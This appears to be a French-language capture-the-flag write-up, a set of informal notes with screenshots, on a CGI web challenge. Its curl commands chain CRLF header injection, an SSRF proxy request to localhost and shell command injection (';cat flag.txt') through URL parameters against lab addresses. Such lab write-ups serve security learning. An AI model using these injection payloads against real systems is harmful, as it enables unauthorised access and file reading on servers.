![alt text](img/Pasted_image_20250325230612.png)

### SCAN 
![alt text](img/Pasted_image_20250325230632.png)
### ENUMERATION

![alt text](img/Pasted_image_20250325230657.png)
### WEB BROWSER

![alt text](img/Pasted_image_20250325230710.png)

Indice dans l'inspector : 
![alt text](img/Pasted_image_20250325230820.png)

Essayons de nous faire passer pour un **localhost** :

mouai : 
La requête:
curl -v 'http://83.136.252.23:46546/cgi-bin/attack-domain?target=127.0.0.1&name=local%0d%0aLocation:/ooo%0d%0aContent-Type%3aproxy%3ahttp%3a//localhost/cgi-bin/attack-ip%3ftarget%3d127.0.0.1%26name%3dtest%3f%0d%0a%0d%0a'

![alt text](img/Pasted_image_20250325235553.png)

### Explication


### Test : 

```bash 
curl -v 'http://83.136.253.71:46720/cgi-bin/attack-domain?target=127.0.0.1&name=local%0d%0aLocation:/ooo%0d%0aContent-Type%3aproxy%3ahttp%3a//localhost/cgi-bin/attack-ip%3ftarget%3d127.0.0.1%26name%3d%27%3bcat%20flag.txt%3b%27%0d%0a%0d%0a'

```

En fait c'est **target** qui est injectable : 

![alt text](img/Pasted_image_20250326001955.png)
```bash
curl -v 'http://83.136.252.23:46546/cgi-bin/attack-domain?target=127.0.0.1&name=local%0d%0aLocation:/ooo%0d%0aContent-Type%3aproxy%3ahttp%3a//localhost/cgi-bin/attack-ip%3ftarget%3d127.0.0.1%26name%3dtest%3f%0d%0a%0d%0a'
```

```sh
curl -v 'http://83.136.253.71:46720/cgi-bin/attack-domain?target=127.0.0.1&name=local%0d%0aLocation%3a%2fooo%0d%0aContent-Type%3aproxy%3ahttp%3a%2f%2flocalhost%2fcgi-bin%2fattack-ip%3ftarget%3d127.0.0.1%3bcat%20flag.txt%26name%3dtest%0d%0a%0d%0a'
```

c'est sur que c'est ça : 
![alt text](img/Pasted_image_20250326002734.png)

